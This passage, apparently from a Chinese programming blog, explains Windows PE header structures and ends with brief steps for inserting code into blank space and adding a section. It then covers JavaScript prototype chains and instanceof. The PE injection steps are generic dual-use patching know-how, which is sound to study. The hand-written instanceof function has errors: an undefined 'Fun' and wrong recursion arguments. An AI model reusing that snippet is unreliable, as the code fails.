title="PE文件的两种状态"></a>PE文件的两种状态</h3><div class="note info"><p><strong>PE文件的两种状态</strong></p><ul><li>PE文件在运行前（静态，存储在磁盘上）和运行时（动态，运行在内存中）的格式是有差异的，这种差异对于我们理解PE文件是如何执行的来说很重要。</li><li>我们在之前的文件分析过程中实际上所看到的是静态的内容，其大小是要根据FileAlignment的值进行文件对齐的，但是在运行时则整体按照扩展PE头的成员SectionAlignment的值进行内存对齐，默认情况下该值为0x1000：</li></ul></div><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://i.328888.xyz/2023/05/07/iaQAbN.png' data-fancybox='default' data-caption='PE文件的两种状态'><img fancybox itemprop="contentUrl" src="https://i.328888.xyz/2023/05/07/iaQAbN.png" class="lazyload" data-srcset="https://i.328888.xyz/2023/05/07/iaQAbN.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="PE文件的两种状态"></a><span class='image-caption'>PE文件的两种状态</span></div></div><h2 id="DOS头结构体"><a href="#DOS头结构体" class="headerlink" title="DOS头结构体"></a>DOS头结构体</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DOS_HEADER</span> &#123;      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="note info"><p><strong></strong></p><ul><li><code>e_magic</code> 为DOS可执行文件标识符，占用2字节，值为<code>0x5A4D</code></li><li><code>e_lfanew</code> 保存了PE头的起始位置</li></ul></div><h2 id="标准PE头"><a href="#标准PE头" class="headerlink" title="标准PE头"></a>标准PE头</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS</span> &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><div class="note info"><p><strong>_IMAGE_NT_HEADERS</strong></p><ul><li><code>Signature</code>: PE标识, 值为<code>0x00004550</code></li><li><code>FileHeader</code>: 文件头</li><li><code>OptionalHeader</code>: 扩展头</li></ul></div><h3 id="文件头（标准PE头）"><a href="#文件头（标准PE头）" class="headerlink" title="文件头（标准PE头）"></a>文件头（标准PE头）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><div class="note info"><p><strong>_IMAGE_FILE_HEADER</strong></p><ol><li><code>Machine</code>: 该字段为WORD类型，占用2字节，该字段标识可执行文件的目标CPU类型</li><li><code>NumberOfSections</code>: 该字段为WORD类型，占用2字节，该字段标识PE文件的节区个数</li><li><code>TimeDateStamp</code>: 该字段表示编译器填写的时间戳与文件属性中（创建时间、修改时间无关），这个值是自1970年1月1日以来用格林威治时间计算的秒数</li><li><code>PointerToSymbolTable</code>: 该字段很少使用，调试相关</li><li><code>NumberOfSymbols</code>: 该字段很少使用，调试相关</li><li><code>SizeOfOptionalHeader</code>: 该字段为WORD类型，占用2字节；该字段指定<code>IMAGE_OPTIONAL_HEADER</code>结构大小(32位PE文件：0xEO 64位PE文件：0xF0)</li><li><code>Characteristics</code>: 该字段为WORD，占用2字节；该字段指定文件属性</li></ol></div><h4 id="Machine-字段取值范围"><a href="#Machine-字段取值范围" class="headerlink" title="Machine 字段取值范围"></a><code>Machine</code> 字段取值范围</h4><table><thead><tr><th>宏定义</th><th>值</th><th>意义</th></tr></thead><tbody><tr><td>IMAGE_FILE_MACHINE_I386</td><td>0x014C</td><td>Intel</td></tr><tr><td>IMAGE_FILE_MACHINE_ALPHA</td><td>0x0184</td><td>DEC Alpha</td></tr><tr><td>IMAGE_FILE_MACHINE_IA64</td><td>0x200</td><td>Intel(64-bit)</td></tr><tr><td>IMAGE_FILE_MACHINE_AXP64</td><td>0x0284</td><td>DEC Alpha(64-bit)</td></tr><tr><td>IMAGE_FILE_MACHINE_AMD64</td><td>0x8664</td><td>AMD64 (K8)</td></tr></tbody></table><h4 id="Characteristics-字段取值范围"><a href="#Characteristics-字段取值范围" class="headerlink" title="Characteristics 字段取值范围"></a><code>Characteristics</code> 字段取值范围</h4><table><thead><tr><th>数据位</th><th>宏定义</th><th>值</th><th>为1时的含义</th></tr></thead><tbody><tr><td>0</td><td>IMAGE_FILE_RELOCS_STRIPPED</td><td>0x0001</td><td>文件中不存在重定位信息</td></tr><tr><td>1</td><td>IMAGE_FILE_EXECUTABLE_IMAGE</td><td>0x0002</td><td>文件是可执行的</td></tr><tr><td>2</td><td>IMAGE_FILE_LINE_NUMS_STRIPPED</td><td>0x0004</td><td>不存在行信息</td></tr><tr><td>3</td><td>IMAGE_FILE_LOCAL_SYMS_STRIPPED</td><td>0x0008</td><td>不存在符号信息</td></tr><tr><td>4</td><td>IMAGE_FILE_AGGRESIVE_WS_TRIM</td><td>0x0010</td><td>调整工作集</td></tr><tr><td>5</td><td>IMAGE_FILE_LARGE_ADDRESS_AWARE</td><td>0x0020</td><td>应用程序可处理大于2GB的地址</td></tr><tr><td>6</td><td></td><td></td><td>此标志位保留</td></tr><tr><td>7</td><td>IMAGE_FILE_BYTES_REVERSED_LO</td><td>0x0080</td><td>小尾方式</td></tr><tr><td>8</td><td>IMAGE_FILE_32BIT_MACHINE</td><td>0x0100</td><td>只在32平台运行</td></tr><tr><td>9</td><td>IMAGE_FILE_DEBUG_STRIPPED</td><td>0x0200</td><td>不包含调试信息</td></tr><tr><td>10</td><td>IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP</td><td>0x0400</td><td>不能从可移动盘运行</td></tr><tr><td>11</td><td>IMAGE_FILE_NET_RUN_FROM_SWAP</td><td>0x0800</td><td>不能从网络运行</td></tr><tr><td>12</td><td>IMAGE_FILE_SYSTEM</td><td>0x1000</td><td>系统文件（驱动程序），不能直接运行</td></tr><tr><td>13</td><td>IMAGE_FILE_DLL</td><td>0x2000</td><td>DLL文件</td></tr><tr><td>14</td><td>IMAGE_FILE_UP_SYSTEM_ONLY</td><td>0x4000</td><td>文件不能在多处理器计算机上运行</td></tr><tr><td>15</td><td>IMAGE_FILE_BYTES_REVERSED_HI</td><td>0x8000</td><td>大尾方式</td></tr></tbody></table><figure class="highlight plaintext"><figcaption><span>Characteristics 计算方式 C++</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如：0102</span><br><span class="line">0000 0001 0000 0010</span><br><span class="line"></span><br><span class="line">下标是1和8位为1；表示文件是一个可执行文件，只在32平台运行</span><br></pre></td></tr></table></figure><h3 id="可选头（扩展头）"><a href="#可选头（扩展头）" class="headerlink" title="可选头（扩展头）"></a>可选头（扩展头）</h3><figure class="highlight plaintext"><figcaption><span>扩展头（32位） C++</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">    WORD    Magic;                                  // 32位PE程序：10B 64位PE程序：20B 重要</span><br><span class="line">    BYTE    MajorLinkerVersion;                     // 链接器版本号</span><br><span class="line">    BYTE    MinorLinkerVersion;                     // 链接器版本号</span><br><span class="line">    DWORD   SizeOfCode;                             // 所有代码节的总和，文件对齐后的大小，编译器填的 没用</span><br><span class="line">    DWORD   SizeOfInitializedData;                  // 包含所有已经初始化数据的节的总大小，文件对齐后的大小，编译器填的 没用</span><br><span class="line">    DWORD   SizeOfUninitializedData;                // 包含未初始化数据的节的总大小，文件对齐后的大小，编译器填的 没用</span><br><span class="line">    DWORD   AddressOfEntryPoint;                    // 程序入口 重要</span><br><span class="line">    DWORD   BaseOfCode;                             // 代码开始的基址，编译器填的 没用</span><br><span class="line">    DWORD   BaseOfData;                             // 数据开始的基址，编译器填的 没用</span><br><span class="line">    DWORD   ImageBase;                              // 内存镜像基址 重要</span><br><span class="line">    DWORD   SectionAlignment;                       // 内存对齐 重要</span><br><span class="line">    DWORD   FileAlignment;                          // 文件对齐 重要</span><br><span class="line">    WORD    MajorOperatingSystemVersion;            // 标识操作系统版本号 主版本号</span><br><span class="line">    WORD    MinorOperatingSystemVersion;            // 标识操作系统版本号 次版本号</span><br><span class="line">    WORD    MajorImageVersion;                      // PE文件自身的版本号</span><br><span class="line">    WORD    MinorImageVersion;                      // PE文件自身的版本号</span><br><span class="line">    WORD    MajorSubsystemVersion;                  // 运行所需子系统版本号</span><br><span class="line">    WORD    MinorSubsystemVersion;                  // 运行所需子系统版本号</span><br><span class="line">    DWORD   Win32VersionValue;                      // 子系统版本值，必须位0</span><br><span class="line">    DWORD   SizeOfImage;                            // 内存中整个PE文件的映射的尺寸，可比实际的值大，必须是SectionAlignment整数倍 重要</span><br><span class="line">    DWORD   SizeOfHeaders;                          // 所有头 + 节表按照文件对齐后的大小，否则加载会出错 重要</span><br><span class="line">    DWORD   CheckSum;                               // 校验和，一些系统文件有要求用来判断文件是否被修改 重要</span><br><span class="line">    WORD    Subsystem;                              // 子系统 驱动程序（1）图形界面（2）控制台、DLL（3）</span><br><span class="line">    WORD    DllCharacteristics;                     // 文件特性 不是针对DLL文件的</span><br><span class="line">    DWORD   SizeOfStackReserve;                     // 初始化时保留的栈大小</span><br><span class="line">    DWORD   SizeOfStackCommit;                      // 初始化实际提交的大小</span><br><span class="line">    DWORD   SizeOfHeapReserve;                      // 初始化保留的堆大小</span><br><span class="line">    DWORD   SizeOfHeapCommit;                       // 初始化实际提交的大小</span><br><span class="line">    DWORD   LoaderFlags;                            // 调试相关</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;                    // 目录项目数</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><div class="note info"><p><strong></strong></p><ul><li>程序真正入口：<code>ImageBase</code> 内存镜像基址 + <code>AddressOfEntryPoint</code> 程序入口</li></ul></div><h2 id="IMAGE-SECTION-HEADER-节表"><a href="#IMAGE-SECTION-HEADER-节表" class="headerlink" title="_IMAGE_SECTION_HEADER(节表)"></a>_IMAGE_SECTION_HEADER(节表)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><h2 id="空白区域添加代码"><a href="#空白区域添加代码" class="headerlink" title="空白区域添加代码"></a>空白区域添加代码</h2><div class="note info"><p><strong></strong></p><ul><li>构造跳转地址公式<br>  要跳转的地址 - E8指令当前的地址 - 5</li></ul></div><h2 id="新增节"><a href="#新增节" class="headerlink" title="新增节"></a>新增节</h2><div class="note info"><p><strong>新增节的步骤</strong></p><ol><li>判断是否有足够的空间，可以添加一个节表</li><li>在节表中新增一个成员</li><li>修改PE头中节的数量</li><li>修改SizeOfImage的大小</li><li>在原有数据的最后，新增一个节的数据（内存对齐的整数倍）</li><li>修正新增节表的属性</li></ol></div>]]></content>
      
      
      <categories>
          
          <category> Windows PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型链的应用</title>
      <link href="/85f7c1f6.html"/>
      <url>/85f7c1f6.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><ol><li>面向对象编程思维<ul><li>提高代码的可复用率 &#x3D;&gt; 更加合理的数据关系</li></ul></li><li>隐式原型和显式原型<ul><li>对象的隐式原型和构造函数的显式原型的连接</li></ul></li><li>原型链机制核心<br> a. new: <emp>执行前绑定this并指向空对象, 将对象的隐式原型指向函数的显式原型</emp><br> b. <code>[[GET]]</code></li></ol></div><span id="more"></span><h2 id="Object和Function"><a href="#Object和Function" class="headerlink" title="Object和Function"></a>Object和Function</h2><div class="note info"><p><strong>关键点</strong></p><ol><li>Object.prototype.<code>__proto__</code> &#x3D; null &#x3D;&gt; 原型链的终点; 不是所有对象都是Object的实例</li><li>Function.prototype.<code>__proto__</code> &#x3D; Object.prototype &#x3D;&gt; new Object()</li><li>Object.<code>__proto__</code> &#x3D; Function.prototype &#x3D;&gt; new Function()</li><li>Function.<code>__proto__</code> &#x3D; Function.prototype &#x3D;&gt; 指向自己, 执行前通过代码注入</li></ol></div><h2 id="instanceof方法"><a href="#instanceof方法" class="headerlink" title="instanceof方法"></a>instanceof方法</h2><div class="note info"><p><strong>instanceof</strong></p><p>a instanceof Func</p><ol><li>本质：递归</li><li>作用：判断 a 是不是 Func 的一个实例 <ul><li>s1.<code>__proto__</code> &#x3D; Student.prototype -&gt; false</li><li>Student.prototype.<code>__proto__</code> &#x3D; Object.prototype -&gt; true</li></ul></li></ol></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Student</span>(<span class="params">name, sex, age, major</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sex</span> = sex;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">major</span> = major;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s1 = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;jack&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>, <span class="string">&#x27;cs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;lucy&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;female&#x27;</span>, <span class="string">&#x27;english&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自己封装instanceof</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property">myInstanceOf</span> = <span class="keyword">function</span>(<span class="params">obj, Func</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(obj === <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(obj) === <span class="title class_">Fun</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">myInstanceOf</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(obj, <span class="title class_">Func</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Object.getPrototypeOf() -&gt; 返回对象的隐式原型</span></span><br></pre></td></tr></table></figure><h2 id="数组和类数组"><a href="#数组和类数组" class="headerlink" title="数组和类数组"></a>数组和类数组</h2><div class="note info"><p><strong>数组和类数组的区别</strong></p><p>本质上是原型链上的区别</p></div> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>];</span><br><span class="line"><span class="comment">// 数组</span></span><br><span class="line">a = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">length</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">__proto__</span>: <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 类数组</span></span><br><span class="line">a = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">length</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">__proto__</span>: xxx</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">demo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">demo</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><h2 id="隐式原型的修改"><a href="#隐式原型的修改" class="headerlink" title="隐式原型的修改"></a>隐式原型的修改</h2><div class="note info"><p><strong>隐式原型的修改</strong></p><ul><li>Object.getPrototypeOf(obj) -&gt; 返回参数对象的隐式原型</li><li>Object.setPrototypeOf(obj, obj) &#x2F;&#x2F; 不推荐</li><li>Object.create()   &#x2F;&#x2F; 返回一个以obj为隐式原型的值的对象<ul><li>如何得到一个没有任何属性的对象<br>  var o &#x3D; Object.create(null);</li></ul></li></ul></div><h2 id="PUT-GET"><a href="#PUT-GET" class="headerlink" title="[[PUT]]&amp;&amp;[[GET]]"></a><code>[[PUT]]</code>&amp;&amp;<code>[[GET]]</code></h2><div class="note info"><p><strong>[[PUT]]</strong></p><p>[[PUT]] -&gt; LHS 左查询</p><ol><li>判断对象中有没有属性<ul><li>如果有, 就找到并返回该地址</li></ul></li><li>如果没找到<ul><li>(1) 沿着原型链找<ul><li>A. 找到这个属性<ul><li>(a). 如果是基本类型 -&gt; 覆盖 -&gt; 在对象自身创建这个属性并返回</li><li>(b). 引用类型：<ul><li>xxx. 对引用类型的引用 -&gt; 覆盖</li><li>yyy. 对引用类型的访问 -&gt; 修改</li></ul></li></ul></li></ul></li><li>(2) 没有找到 -&gt; 直到原型链终点 -&gt; 给对象自身创建一个</li></ul></li></ol></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到该属性并且是基本类型 </span></span><br><span class="line"><span class="comment">// bar.prototype.b = 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bar.b = 2;</span></span><br><span class="line"><span class="comment">// console.log(bar)</span></span><br><span class="line"><span class="comment">/** 返回结果: b为基本类型, 会在自身创建属性并返回, 原型链上不变</span></span><br><span class="line"><span class="comment"> * bar &#123;</span></span><br><span class="line"><span class="comment"> *  b: 2,</span></span><br><span class="line"><span class="comment"> *  [[prototype]]: Object &#123;</span></span><br><span class="line"><span class="comment"> *      b: 1</span></span><br><span class="line"><span class="comment"> *  &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到该属性并且是引用类型 -- 访问</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">demo</span> = &#123;</span><br><span class="line">    <span class="attr">m</span>: <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// bar.demo.m = 2;</span></span><br><span class="line"><span class="comment">// console.log(Object.prototype);</span></span><br><span class="line"><span class="comment">/** 返回结果 对引用类型的访问会修改</span></span><br><span class="line"><span class="comment"> * Object &#123;</span></span><br><span class="line"><span class="comment"> *  demo: &#123;</span></span><br><span class="line"><span class="comment"> *      m: 2,</span></span><br><span class="line"><span class="comment"> *  &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到该属性 -- 对引用类型的引用</span></span><br><span class="line">bar.<span class="property">demo</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bar);</span><br><span class="line"><span class="comment">/** 返回结果 对引用类型的引用会覆盖</span></span><br><span class="line"><span class="comment"> * bar &#123;</span></span><br><span class="line"><span class="comment"> *  demo: 2,</span></span><br><span class="line"><span class="comment"> *  [[prototype]]: Object &#123;</span></span><br><span class="line"><span class="comment"> *      demo: &#123; m: 1 &#125;,</span></span><br><span class="line"><span class="comment"> *  &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">bar.<span class="property">a</span> = <span class="number">1</span> <span class="comment">// 会在对象自身创建</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** 返回</span></span><br><span class="line"><span class="comment"> * bar &#123;</span></span><br><span class="line"><span class="comment"> *  a: 1,</span></span><br><span class="line"><span class="comment"> *  [[prototype]]: Object</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><h3 id="面试题-01"><a href="#面试题-01" class="headerlink" title="面试题 - 01"></a>面试题 - 01</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">A</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">n</span> = <span class="number">3</span>;</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add1</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">n</span>++;</span><br><span class="line">    <span class="comment">// this.n = this.n + 1 RHS [[GET]]</span></span><br><span class="line">    <span class="comment">// 左边this.n =&gt; LHS 